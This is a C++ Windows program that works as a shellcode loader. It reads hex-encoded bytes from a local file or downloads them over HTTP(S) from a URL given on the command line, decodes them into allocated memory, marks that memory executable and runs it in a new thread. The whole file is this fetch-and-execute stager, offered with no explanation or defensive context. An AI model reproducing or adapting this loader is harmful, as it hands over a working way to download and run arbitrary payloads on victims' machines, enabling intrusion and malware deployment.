#include <Windows.h>
#include <winhttp.h>
#include <shlwapi.h>
#include <tchar.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <algorithm>
#pragma comment(lib, "winhttp.lib")

using namespace std;

void hex_to_ascii(string src, char* dst) {
	for (u_int i = 0; i < src.length(); i += 2) {
		dst[i / 2] = (char)strtoul(src.substr(i, 2).c_str(), NULL, 16);
	}
}

wstring s2ws(const std::string& s)
{
	int len;
	int slength = (int)s.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
	std::wstring r(buf);
	delete[] buf;
	return r;
}

int startswith(string rem_file, string patt) {
	if (rem_file.rfind(patt, 0) == 0) {
		return 1;
	}
	return 0;
}

struct Uri
{
public:
	std::wstring QueryString, Path, Protocol, Host, Port;
	static Uri Parse(const std::wstring& uri)
	{
		Uri result;
		typedef std::wstring::const_iterator iterator_t;
		if (uri.length() == 0)
			return result;
		iterator_t uriEnd = uri.end();
		// get query start
		iterator_t queryStart = std::find(uri.begin(), uriEnd, L'?');
		// protocol
		iterator_t protocolStart = uri.begin();
		iterator_t protocolEnd = std::find(protocolStart, uriEnd, L':');            //"://");
		if (protocolEnd != uriEnd)
		{
			std::wstring prot = &*(protocolEnd);
			if ((prot.length() > 3) && (prot.substr(0, 3) == L"://"))
			{
				result.Protocol = std::wstring(protocolStart, protocolEnd);
				protocolEnd += 3;   //      ://
			}
			else
				protocolEnd = uri.begin();  // no protocol
		}
		else
			protocolEnd = uri.begin();  // no protocol
		// host
		iterator_t hostStart = protocolEnd;
		iterator_t pathStart = std::find(hostStart, uriEnd, L'/');  // get pathStart
		iterator_t hostEnd = std::find(protocolEnd,
			(pathStart != uriEnd) ? pathStart : queryStart,
			L':');  // check for port
		result.Host = std::wstring(hostStart, hostEnd);
		// port
		if ((hostEnd != uriEnd) && ((&*(hostEnd))[0] == L':'))  // we have a port
		{
			hostEnd++;
			iterator_t portEnd = (pathStart != uriEnd) ? pathStart : queryStart;
			result.Port = std::wstring(hostEnd, portEnd);
		}
		// path
		if (pathStart != uriEnd)
			result.Path = std::wstring(pathStart, queryStart);
		// query
		if (queryStart != uriEnd)
			result.QueryString = std::wstring(queryStart, uri.end());
		return result;
	}   // Parse
};  // uri


string get_hex(string rem_file) {
	wstring full_tmp = s2ws(rem_file);
	LPCWSTR full_ws = full_tmp.c_str();
	Uri u0 = Uri::Parse(full_ws);
	wcout << L"PROTO: " + u0.Protocol << endl;
	wcout << L"PORT: " + u0.Port << endl;
	wcout << L"HOST: " + u0.Host << endl;
	wcout << L"PATH:  " + u0.Path << endl;
	int PORT;
	int SEC_FLAG = 0;
	int IS_SECURE = 0;
	// port portion empty, go default 80/443
	if (u0.Port == L"") {
		if (u0.Protocol == L"https") {
			PORT = 443;
		}
		else {
			PORT = 80;
		}
	}
	if (u0.Protocol == L"https") {
		SEC_FLAG = 0x00800000;
		IS_SECURE = 1;
	}
	string res;
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;
	// Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(L"Low-Dur 0.1",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);
	// Specify an HTTP server.
	if (hSession)
		hConnect = WinHttpConnect(hSession, u0.Host.c_str(),//L"www.microsoft.com",
			PORT, 0);
	// Create an HTTP request handle.
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"GET", u0.Path.c_str(),
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			SEC_FLAG);
	// Send a request.
	if (hRequest)
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS,
			0, WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);
	// End the request.
	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);

	// Keep checking for data until there is nothing left.
	if (bResults)
	{
		do
		{
			// Check for available data.
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
				printf("Error %u in WinHttpQueryDataAvailable.\n",
					GetLastError());
				break;
			}

			// No more available data.
			if (!dwSize)
				break;

			// Allocate space for the buffer.
			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer)
			{
				printf("Out of memory\n");
				break;
			}

			// Read the Data.
			ZeroMemory(pszOutBuffer, dwSize + 1);

			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
				dwSize, &dwDownloaded))
			{
				printf("Error %u in WinHttpReadData.\n", GetLastError());
			}

			else
			{
				//printf("%s", pszOutBuffer);
				return pszOutBuffer;
			}

			// Free the memory allocated to the buffer.
			//return string(pszOutBuffer);
			delete[] pszOutBuffer;

			// This condition should never be reached since WinHttpQueryDataAvailable
			// reported that there are bits to read.
			if (!dwDownloaded)
				break;

		} while (dwSize > 0);
	}
	else
	{
		// Report any errors.
		printf("Error %d has occurred.\n", GetLastError());
	}

	// Close any open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

}

std::string trim(const std::string& s)
{
	std::string::const_iterator it = s.begin();
	while (it != s.end() && isspace(*it))
		it++;

	std::string::const_reverse_iterator rit = s.rbegin();
	while (rit.base() != it && isspace(*rit))
		rit++;

	return std::string(it, rit.base());
}

int main(int argc, char* argv[], char* envp[]) {
	string myfile;
	string buf;
	int is_web = 0;
	if (argc == 1) {
		myfile = "data.db";
	}
	else if (startswith(string(argv[1]), "http")) {
		string URL = argv[1];
		buf = trim(get_hex(URL));
		is_web = 1;
	}
	else {
		myfile = string(argv[1]);
	}
	if (!is_web) {
		std::fstream f(myfile, std::ios::in);
		if (!f.is_open())
			return 0;
		f >> buf;
	}

	// create page
	char* addr = (char*)VirtualAlloc(NULL, buf.length() / 2, MEM_COMMIT, PAGE_READWRITE);
	if (!addr) {
		return 0;
	}
	// copy data
	hex_to_ascii(buf, addr);

	// change perms
	DWORD old;
	if (!VirtualProtect(addr, buf.length() / 2, PAGE_EXECUTE_READ, &old))
		return 0;

	// create thread
	DWORD tid;
	HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, &tid);
	if (!t)
		return 0;

	// wait
	WaitForSingleObject(t, INFINITE);

	return 0;
}

